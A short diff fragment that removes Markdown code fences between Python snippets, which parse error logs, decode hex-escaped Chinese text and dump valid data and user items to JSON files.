                     rep = hex_escape_to_chinese(rep)
 
@@ -1741,11 +1744,6 @@ for log_index in range(len(error_log_list)):
 
 with open('valid_data.json', 'w+') as fp:
     json.dump(valid_data_list, fp)
-```
-
-
-
-```
 import re
 import csv
 import json
@@ -1760,11 +1758,6 @@ for valid_data in valid_data_item:
 print(set(response_set))
 
 # {'您的信息录入成功！', '您输入的用户名不存在！', '您的信息更新成功！'}
-```
-
-
-
-```
 import re
 import csv
 import json
@@ -1800,11 +1793,6 @@ for data in valid_data_item:
 
 with open('user_item.json', 'w+') as fp:
     json.dump(final_item, fp)
-```
-
-
-
-```
 import re
 import csv
 import json
